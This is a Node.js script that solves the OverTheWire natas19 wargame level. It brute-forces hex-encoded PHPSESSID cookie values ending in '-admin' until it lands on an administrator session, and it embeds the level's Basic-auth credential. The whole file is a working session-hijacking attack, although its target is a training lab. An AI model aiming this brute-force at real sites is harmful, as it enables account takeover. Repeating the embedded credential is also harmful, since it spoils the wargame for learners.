const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

function gen(num) {
    let ch = num.toString();
    let x = '';
    for(let i=0; i<ch.length; i++) {
        x += '3';
        x += ch[i];
    }
    return x;
}

async function req(ch) {
    const headers = {
        'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
        'Cookie': `PHPSESSID=${gen(ch)}2d61646d696e`
    }
    const res = await axios.post(`http://natas19.natas.labs.overthewire.org/index.php?debug=1`, `username=admin&password=`, {headers, withCredentials: true});
    console.log(`For try #${ch}`);
    if(res.data.includes('regular')) {
        // console.log(res.data);
        return false;
    } else {
        console.log(res.data);
        return true;
    }
}

async function calc() {
    for(let i=1; i<=640; i++) {
        let val = await req(i);
        if(val) {
            break;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));